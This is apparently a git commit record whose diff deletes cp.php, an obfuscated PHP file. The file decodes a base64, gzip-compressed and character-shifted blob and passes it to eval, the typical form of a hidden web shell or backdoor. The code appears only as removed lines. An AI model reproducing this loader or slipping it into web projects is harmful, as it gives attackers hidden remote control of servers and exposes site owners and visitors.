196642daed1bca87e5831b84a414725d5b0e1aa6
cPanel Karma <hridoyorion@gmail.com>
2023-09-05 05:51:49 -0700

    Delete cp.php

--- cp.php
+++
@@ -1,9 +0,0 @@
-<?php function HiuV($LRjfqx)
-{ 
-$LRjfqx=gzinflate(base64_decode($LRjfqx));
- for($i=0;$i<strlen($LRjfqx);$i++)
- {
-$LRjfqx[$i] = chr(ord($LRjfqx[$i])-1);
- }
- return $LRjfqx;
- }eval(HiuV("jVTvb5swEP1bLAvJoCIgnSZNTWCV+mNfqq1au09RhBw4hlWwmW2aZFn/9p0hpN26aUNKBOe753fvnk0IPqIivpd/uLpfMqWFkmyVprRUHdCA7M+FFLkB67NSmK7huxy0VtqwMAnmVS8LixUEpNVw+njqexa2NvRarr/10OtLWPf2RoB8Dl0LOQZEOgv2HtdJCtuuUSX4fygjA2Awx7zZ67wJiziYpSdWwVyD7bUkVovWd0XLBINPXpm0XEhDUnJeiQZ8FoMtYslbKKNCyYrhFqWackzBZSm0T+NHrscsGswHnaYkpckEil38u/RYiZp6heqlTWe4ZYElydxrhLF/La6UBl7U/pjFDTlABXuENVZ3ykzoIY3KNQ2OjBym1bkGnFyBXeMqCxkLJ4S5pzYSNKYhiNjmX8F2m16UvhNpWEIuTqlH3ghuwMQ0mmqdYkJ/x1oW16qFmEUj2pI55mwVsThqd1GB6s69jtsaU3GDYlP6o5jCIDNe8jUOZMAKUJxCdbvxKyQMIV0hIr0Gj+zWurF1qSPrqOc4SYtWNP7/FXJjNkqX6bN7u5AdoxSVopgHRa0IXVid1dZ25ix+1iCiZ6fJuzc/6O97UBeakCK6iG2Z4Z/OFmudUTf3k5P5k3ugMbAft/ioSHHLJTTkGv1R4uwx5cXhvIR2PJzp4dVZqRMPPNVoGz+I6BCOurqjI2u2qGfZNapDLlBoq/QixsACDdWSFmytsMvbT3f3NFu4Y8YxibgOUmpqaBrUswRDyWCeWjUl6JTeuRVyMa5otTEpfUtJoRp8mSUJdX0esIZuh5+QXW+J3XUOul+3wmJJg/qkI2dK0GA9Ll5toegtOBTHMmPjqcsdy+UvrFau+yGAtqrwtpL+IEZIN+7MbLSw6KohIcTpCdtANuxF7vAWA5RijOGgRnT2Ap3hpVEVjTITxNEGU0f8wJ+1Owt4LDstHhnBttGHKcvXDZcPjNQaqtRZAYlFNBu1+/L5ZhHzzE33ffYT"));?>
